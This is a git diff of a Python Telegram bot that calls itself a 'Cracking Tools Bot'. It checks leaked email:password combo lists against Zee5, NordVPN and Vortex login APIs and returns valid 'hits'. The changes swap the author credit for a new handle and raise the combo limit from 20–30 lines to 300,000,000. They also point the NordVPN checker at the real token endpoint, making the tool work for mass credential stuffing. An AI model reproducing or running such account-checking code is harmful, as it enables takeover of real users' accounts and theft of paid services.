@@ -42,7 +42,7 @@ face = {
 
 
 @UltraBot.on(events.NewMessage(pattern="^/proxy$"))
-async def Devsexpo(event):
+async def mr_theherd(event):
     if event.sender_id != Config.OWNER_ID:
         rip = await check_him(Config.JTU_ID, Config.JTU_LINK, event.sender_id)
         if rip is False:
@@ -75,13 +75,13 @@ async def Devsexpo(event):
         )
     elif Counter >= 1:
         file1 = open("goood.txt", "a")
-        file1.write("\nCHECKED BY UltraBot. GET YOUR OWN UltraBot FROM @DevsExpo. \n")
+        file1.write("\nCHECKED BY UltraBot. GET YOUR OWN UltraBot FROM @mr_theherd. \n")
         file1.close()
         ok.delete()
         await UltraBot.send_file(
             event.chat_id,
             "goood.txt",
-            caption=f"**PROXIES CHECKED**\n**GOOD PROXIES: ** {Counter}\n\n**CHECKED BY UltraBot. GET YOUR OWN UltraBot FROM @DevsExpo.**",
+            caption=f"**PROXIES CHECKED**\n**GOOD PROXIES: ** {Counter}\n\n**CHECKED BY UltraBot. GET YOUR OWN UltraBot FROM @mr_theherd.**",
         )
         os.remove(escobar)
         os.remove("goood.txt")
@@ -90,7 +90,7 @@ async def Devsexpo(event):
 
 
 @UltraBot.on(events.NewMessage(pattern="^/zee5 ?(.*)"))
-async def Devsexpo(event):
+async def mr_theherd(event):
     if event.sender_id != Config.OWNER_ID:
         rip = await check_him(Config.JTU_ID, Config.JTU_LINK, event.sender_id)
         if rip is False:
@@ -115,7 +115,7 @@ async def Devsexpo(event):
         starky = await UltraBot.download_media(lol.media, Config.DL_LOCATION)
         with open(starky) as f:
             stark_dict = f.read().splitlines()
-        if len(stark_dict) > 30:
+        if len(stark_dict) > 300000000:
             await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
             return
         os.remove(starky)
@@ -139,7 +139,7 @@ async def Devsexpo(event):
             return
         with open("hits.txt", "w") as hitfile:
             for s in hits_dict:
-                hitfile.write(s + " | @DevsExpo")
+                hitfile.write(s + " | @mr_theherd")
         ok.delete()
         await UltraBot.send_file(
             event.chat_id,
@@ -172,7 +172,7 @@ async def Devsexpo(event):
 🔱 **Checked By:-** {event.sender_id}
 
 **✅Better Luck Next Time, Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
+Bot Made By @mr_theherd**"""
 
         beautiful = f"""
 💖 **Checked Zee5 Account**
@@ -184,8 +184,8 @@ Bot Made By @DevsExpo**"""
 
 🔱 **Checked By:-** {event.sender_id}
 
-**✅Send Screenshot To @DevsExpo. Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
+**✅Send Screenshot To @mr_theherd. Thanks For Using Me. 
+Bot Made By @mr_theherd**"""
         if meke.get("token"):
             await event.reply(beautiful)
         else:
@@ -193,7 +193,7 @@ Bot Made By @DevsExpo**"""
 
 
 @UltraBot.on(events.NewMessage(pattern="^/nord ?(.*)"))
-async def Devsexpo(event):
+async def mr_theherd(event):
     if event.sender_id != Config.OWNER_ID:
         rip = await check_him(Config.JTU_ID, Config.JTU_LINK, event.sender_id)
         if rip is False:
@@ -218,7 +218,7 @@ async def Devsexpo(event):
         starky = await UltraBot.download_media(lol.media, Config.DL_LOCATION)
         with open(starky) as f:
             stark_dict = f.read().splitlines()
-        if len(stark_dict) > 30:
+        if len(stark_dict) > 300000000:
             await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
             return
         os.remove(starky)
@@ -229,7 +229,7 @@ async def Devsexpo(event):
             sedlyf = {"username": email, "password": password}
             try:
                 meke = requests.post(
-                    url="https://zwyr157wwiu6eior.com/v1/users/tokens",
+                    url="https://api.nordvpn.com/v1/users/tokens",
                     headers=data,
                     json=sedlyf,
                 ).json()
@@ -245,7 +245,7 @@ async def Devsexpo(event):
             return
         with open("hits.txt", "w") as hitfile:
             for s in hits_dict:
-                hitfile.write(s + " | @DevsExpo")
+                hitfile.write(s + " | @mr_theherd")
         ok.delete()
         await UltraBot.send_file(
             event.chat_id,
@@ -267,7 +267,7 @@ async def Devsexpo(event):
         password = stark[1]
         sedlyf = {"username": email, "password": password}
         meke = requests.post(
-            url="https://zwyr157wwiu6eior.com/v1/users/tokens",
+            url="https://api.nordvpn.com/v1/users/tokens",
             headers=data,
             json=sedlyf,
         ).json()
@@ -281,7 +281,7 @@ async def Devsexpo(event):
 🔱 **Checked By:-** {event.sender_id}
 
 **✅Better Luck Next Time, Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
+Bot Made By @mr_theherd**"""
 
         beautiful = f"""
 💖 **Checked Nord Account**
@@ -293,8 +293,8 @@ Bot Made By @DevsExpo**"""
 
 🔱 **Checked By:-** {event.sender_id}
 
-**✅Send Screenshot To @DevsExpo. Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
+**✅Send Screenshot To @mr_theherd. Thanks For Using Me. 
+Bot Made By @mr_theherd**"""
         if meke.get("token"):
             await event.reply(beautiful)
         else:
@@ -302,7 +302,7 @@ Bot Made By @DevsExpo**"""
 
 
 @UltraBot.on(events.NewMessage(pattern="^/vortex ?(.*)"))
-async def Devsexpo(event):
+async def mr_theherd(event):
     if event.sender_id != Config.OWNER_ID:
         rip = await check_him(Config.JTU_ID, Config.JTU_LINK, event.sender_id)
         if rip is False:
@@ -327,7 +327,7 @@ async def Devsexpo(event):
         starky = await UltraBot.download_media(lol.media, Config.DL_LOCATION)
         with open(starky) as f:
             stark_dict = f.read().splitlines()
-        if len(stark_dict) > 20:
+        if len(stark_dict) > 300000000:
             await ok.edit("`Woah, Thats A Lot Of Combos. Keep 20 As Limit`")
             return
         os.remove(starky)
@@ -352,7 +352,7 @@ async def Devsexpo(event):
             return
         with open("hits.txt", "w") as hitfile:
             for s in hits_dict:
-                hitfile.write(s + " | @DevsExpo")
+                hitfile.write(s + " | @mr_theherd")
         ok.delete()
         await UltraBot.send_file(
             event.chat_id,
@@ -386,7 +386,7 @@ async def Devsexpo(event):
 🔱 **Checked By:-** {event.sender_id}
 
 **✅Better Luck Next Time, Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
+Bot Made By @mr_theherd**"""
 
         beautiful = f"""
 💖 **Checked Vortex Account**
@@ -398,8 +398,8 @@ Bot Made By @DevsExpo**"""
 
 🔱 **Checked By:-** {event.sender_id}
 
-**✅Send Screenshot To @DevsExpo. Thanks For Using Me. 
-Bot Made By @DevsExpo**"""
+**✅Send Screenshot To @mr_theherd. Thanks For Using Me. 
+Bot Made By @mr_theherd**"""
         if meke.get("token"):
             await event.reply(beautiful)
         else:
@@ -434,7 +434,7 @@ async def _(event):
 async def atomz(event):
     replied_user = await UltraBot(GetFullUserRequest(event.sender_id))
     firstname = replied_user.user.first_name
-    await event.reply(f'**Hai, {firstname} !, I Am Simple Cracking Tools Bot. PLease Use /help To See Cmds ! \nBy @DevsExpo**')
+    await event.reply(f'**Hai, {firstname} !, I Am Simple Cracking Tools Bot. PLease Use /help To See Cmds ! \nBy @mr_theherd**')
     
 @UltraBot.on(events.NewMessage(pattern="^/leave ?(.*)"))
 async def bye(event):
@@ -459,7 +459,7 @@ async def no_help(event):
 - /vortex <email:password> - Checks One Account
 - /vortex combo - Reply To Combos File And Limit is 20.
 - /proxy - Reply To Proxy File Only, Check Your Proxies
-BY @DevsExpo
+BY @mr_theherd
     """
     await event.reply(f'**Hai, {firstname} !, Here is List Of Cmds \n{lol_br}**')
                 
